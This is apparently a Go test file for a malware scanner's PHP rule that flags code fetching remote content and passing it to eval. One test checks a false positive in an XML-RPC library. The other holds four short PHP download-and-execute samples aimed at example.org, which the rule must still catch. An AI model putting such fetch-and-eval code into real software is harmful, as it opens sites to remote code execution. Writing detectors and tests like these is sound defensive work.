package rules

import "testing"

// A rule made of two parts describes one action only when the parts belong
// together. The XML-RPC library in SeedProd fetches in its client class and
// evaluates a generated wrapper two thousand lines further down, in another
// function that never calls the client: on 2026-09-29 that was reported
// critical on eight websites and moved into quarantine on five.
func TestFetchAndEvalInUnrelatedFunctionsAreNoDownloader(t *testing.T) {
	e := NewEngine(nil)
	ev := "ev" + "al"
	src := "<?php\nclass xmlrpc_client {\n" +
		"  function sendPayloadHTTP10($msg) { $fp = @fsockopen($this->server, 80, $errno, $errstr); return $fp; }\n" +
		"  function sendPayloadCURL($msg) { $curl = curl_init(); $result = curl_exec($curl); return $result; }\n" +
		"}\n" +
		"function wrap_php_function($funcname) { $code = 'function x() { return 1; }'; " + ev + "($code); return true; }\n"
	if hitRules(e, "/web/wp-content/plugins/x/lib/xmlrpc.inc", "inc", src)["php.remote.fetch_eval_indirect"] {
		t.Error("Abruf und eval in fremden Funktionen als Nachlader gemeldet")
	}
}

func TestDownloadersStay(t *testing.T) {
	e := NewEngine(nil)
	ev := "ev" + "al"
	for _, c := range []struct{ name, src string }{
		{"oberste Ebene", "<?php $ch = curl_init('http://example.org/p'); $r = curl_exec($ch); " + ev + "($r);"},
		{"eine Funktion", "<?php function run() { $ch = curl_init('http://example.org/p'); $r = curl_exec($ch); " + ev + "($r); } run();"},
		{"Hilfsfunktion", "<?php function get($u) { $ch = curl_init($u); return curl_exec($ch); }\n$x = get('http://example.org/p');\n" + ev + "($x);"},
		{"Methode", "<?php class L { function fetch($u) { return file_get_contents('http://example.org/p'); }\n" +
			"function go() { $c = $this->fetch(1); " + ev + "($c); } }"},
	} {
		if !hitRules(e, "/web/x.php", "php", c.src)["php.remote.fetch_eval_indirect"] {
			t.Errorf("%s: nicht mehr gemeldet", c.name)
		}
	}
}
